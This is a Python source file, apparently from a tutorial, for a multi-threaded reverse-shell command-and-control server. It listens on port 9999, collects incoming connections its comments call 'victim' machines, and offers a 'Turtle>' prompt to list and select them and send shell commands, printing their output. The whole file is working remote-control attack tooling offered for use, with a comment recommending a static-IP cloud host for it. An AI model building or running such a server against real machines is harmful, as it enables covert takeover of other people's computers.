# Handling multiple connections using Multi threading...

import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2

# job-1: Listen and accept connections from thread1
# job-2: Send commands to the already connected client ..

JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address =[]



# creating a socket ( used to connect two computers..)
def create_socket():
    try:
        global host
        global port
        global s     # socket object variable..
        host = ""    # better  to create a server in digital ocean so that ip will be static..
        port = 9999  # not commonly used port..
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation Error: " +str(msg))

# Binding the host and port for the socket connection..
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: " +str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding Failed: " +str(msg) + "\n" + "Retrying....")
        bind_socket()



# Handling connections from multiple clients and saving the info in a list..
# also vanishing the connection and address info when server.py file restarted..

def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(5)      # prevents timeout ...
            all_connections.append(conn)
            all_address.append(address)
            print("Connection Established: " + address[0])
        except:
            print("Error While Accepting The Connection....")


#### 2nd job functionality--> see all connections, select a client, send commands to that client..
## start a own shell or a prompt..
# list_connections...
## it display as   1  friend-1 like id and client info..

def start_turtle():
    while True:
        cmd = input("Turtle> ")
        if cmd == "list":
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command Not Recognized!!!")



# Display all current active connections with the client..

def list_connections():
    results = ''
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results = str(i) + "  " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"
    print("-----Clients-----" + "\n" + results)


# selecting the target ...

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to: " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">" , end = "")
        return conn
    except:
        print("Selection Invalid:...")
        return None

#sending the commands to the client/victim machine ...

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break
                #conn.close()
                #s.close()
                #sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response, end="")
        except:
            print("Error while sending commands...")
            break

# creating workers as threads..

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do next job that is in the Queue. (Handle connections, send commands..)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
